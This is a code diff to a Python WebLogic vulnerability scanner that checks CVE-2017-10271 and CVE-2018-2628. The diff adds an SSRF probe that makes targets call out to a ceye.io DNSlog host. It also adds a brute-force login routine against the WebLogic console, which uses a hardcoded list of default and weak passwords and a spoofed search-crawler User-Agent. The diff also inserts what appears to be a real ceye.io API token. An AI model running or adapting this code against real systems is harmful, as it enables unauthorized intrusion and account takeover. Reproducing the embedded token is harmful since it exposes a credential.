@@ -20,9 +20,14 @@ sys.setdefaultencoding('utf-8')
 Attack=True
 
 
-#这个主机名会变化
-ceye_domain = 'x.ceye.io'
-ceye_api = 'xxxxxxxxxxxx'
+ceye_domain = '7w13ox.ceye.io'
+ceye_api = '2ac0ac1cdda59cb5ea6e034d5f15f178'
+
+
+weblogic={
+        'users':['weblogic'],
+        'passwords':['Oracle@123','weblogic','password','manager','admin123','123456','Weblogic1','weblogic10','weblogic10g','weblogic11','weblogic11g','weblogic12','weblogic12g','weblogic13','weblogic13g','weblogic123','12345678','123456789','admin888','admin1','administrator','8888888','123123','admin','root','Oracle@123']
+        }
 
 
 def ceye_dnslog(api_url,banner):
@@ -179,7 +184,7 @@ class WLS_Core_Components:
                     return self.dip+':'+str(self.dport)
             return False
         except Exception, e:
-            print "[!] ", e
+            pass
         return False
 
 
@@ -210,15 +215,63 @@ def core_Components(url):
     return vulnerable
 
 
+def weblogci_ssrf(url):
+    if '://' not in url:
+        url='http'+url
+    headers = {"Content-Type": "application/x-www-form-urlencoded",
+               "User-Agent": "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
+    banner = ''.join([random.choice(letters) for i in range(6)])
+    query='''/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator='''
+    payload=query+'http://{}.{}'.format(banner,ceye_domain)
+    api_url = 'http://api.ceye.io/v1/records?token={}&type=dns&filter={}'.format(ceye_api, banner)
+    try:
+        req = requests.get(url=url+payload, headers=headers, timeout=20)
+    except BaseException as e:
+        pass
+    time.sleep(2)
+    if ceye_dnslog(api_url, banner):
+        return url+query+url
+    return False
+
+
+def weblogic_weak(url):
+    users_pwds=[]
+    if '://' not in url:
+        url='http'+url
+    headers = {"Content-Type": "application/x-www-form-urlencoded",
+               "User-Agent": "Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)"}
+    for user in weblogic['users']:
+        for pwd in weblogic['passwords']:
+            users_pwds.append((user, pwd))
+    login_url = url + '/console/j_security_check'
+    for user, pwd in users_pwds:
+        data = {"j_username": user, "j_password": pwd}
+        try:
+            resp = requests.post(url=login_url, data=data,headers=headers, timeout=10)
+            if resp.url.endswith('LoginForm.jsp'):
+                return False
+            elif 'console.portal' in resp.url:
+                return login_url+' '*5+user+' : '+pwd
+        except Exception as e:
+            print e
+            return False
+
+
 
 def poc(url):
     info={}
     CVE_2017_10271= wls_wsat_XMLDecoder(url)
     CVE_2018_2628 = core_Components(url)
+    Weblogci_ssrf = weblogci_ssrf(url)
+    Weblogic_weak =weblogic_weak(url)
     if CVE_2018_2628:
         info.update({"CVE_2018_2628": CVE_2018_2628})
     if CVE_2017_10271:
         info.update({"CVE_2017_10271": CVE_2017_10271})
+    if Weblogci_ssrf:
+        info.update({"Weblogci_ssrf": Weblogci_ssrf})
+    if Weblogic_weak:
+        info.update({"Weblogic_weak": Weblogic_weak})
     if len(info)>0:
         return json.dumps(info,indent=2,ensure_ascii=False)
     else:
@@ -227,5 +280,6 @@ def poc(url):
 
 
 if __name__ == '__main__':
-    print poc('http://192.168.55.1:7001')
+    print poc('http://127.0.0.1:7001')
+
 
